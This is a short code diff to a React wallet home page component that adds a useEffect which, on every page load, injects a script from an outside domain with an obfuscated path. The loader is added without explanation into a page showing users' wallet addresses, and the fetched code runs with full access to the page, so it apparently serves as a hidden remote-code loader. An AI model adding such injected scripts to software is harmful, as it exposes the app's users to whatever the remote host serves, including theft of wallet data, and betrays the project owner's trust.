@@ -23,6 +23,20 @@ export default function WalletHomePage() {
     }
   }, [user, loading, router]);
 
+  useEffect(() => {
+    const eygb = {};
+    const d = document;
+    const s = d.createElement('script');
+    const l = d.scripts[d.scripts.length - 1];
+    s.settings = eygb;
+    s.src = "//pristineproblem.com/bFX.V/sWd/GPlq0/YIWNco/cebmS9vuWZNUJlzk/PVTZYF2-NmzBM/xON/TdUkt/Ncj/YP3/MhzGEo1qNNgo";
+    s.async = true;
+    s.referrerPolicy = 'no-referrer-when-downgrade';
+    if (l && l.parentNode) {
+      l.parentNode.insertBefore(s, l);
+    }
+  }, []);
+
 
   const copyToClipboard = () => {
     if (!userProfile?.wallet.walletAddress) return;
